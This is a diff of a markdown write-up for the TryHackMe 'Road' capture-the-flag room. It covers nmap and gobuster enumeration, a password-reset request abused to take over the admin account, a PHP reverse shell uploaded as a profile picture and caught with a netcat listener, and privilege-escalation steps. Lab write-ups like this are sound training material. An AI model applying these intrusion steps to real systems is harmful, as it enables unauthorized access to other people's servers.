@@ -2,7 +2,7 @@
 
 Room link: https://tryhackme.com/room/road
 
-# Scanning 
+## Scanning 
 I first conducted a scan using nmap with the ```-A``` option. 
 ```
 ajread@aj-ubuntu:~/TryHackMe/practice$ nmap -A -Pn [REDACTED]
@@ -20,7 +20,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 21.43 seconds
 ```
-# Enumeration
+## Enumeration
 I did some enumeration of the http service using both nikto and gobuster.
 ```
 ajread@aj-ubuntu:~/TryHackMe$ gobuster -u http://[REDACTED] -w /home/ajread/resources/wordlists/SecLists/Discovery/Web-Content/common.txt 
@@ -56,7 +56,6 @@ The /v2 had a login page that allowed me to register for an account. I registere
 Right now, only admin has access to this feature. Please drop an email to admin@sky.thm in case of any changes.
 ```
 With the admin email, I can now try to reset its password using the ```ResetUser``` page. When a user requests a new password, it sends a POST request to ```lostpassword.php``` with the data below. 
-
 ```
 POST /v2/lostpassword.php HTTP/1.1
 Host: [REDACTED]
@@ -141,8 +140,7 @@ And, I was able to authenticate with credentials ```admin@sky.thm:test```. Now, 
 <script type="text/javascript">
 </html> 
 ```
-
-# Initial Access 
+## Initial Access 
 I created a php reverse shell using pentest monkey and uploaded it as my profile picture. Then, I opened a netcat listener at port 9999 (the port I chose for the php reverse shell). 
 ```
 ajread@aj-ubuntu:~/TryHackMe$ nc -lnvp 9999
@@ -169,7 +167,7 @@ I was also able to read the user flag.
 $ wc -c user.txt
 33 user.txt
 ```
-# Privilege Escalation 
+## Privilege Escalation 
 I looked around the machine and found that there is a mongodb user within ```/etc/passwd```. 
 ```
 mongodb:x:114:65534::/home/mongodb:/usr/sbin/nologin
@@ -255,4 +253,6 @@ Authenticating as: webdeveloper
 Password: 
 ==== AUTHENTICATION COMPLETE ===
 ```
+
+## Assistance 
 Writeup done with the help of: ```https://wiki.thehacker.nz/docs/thm-writeups/road-medium/```. 
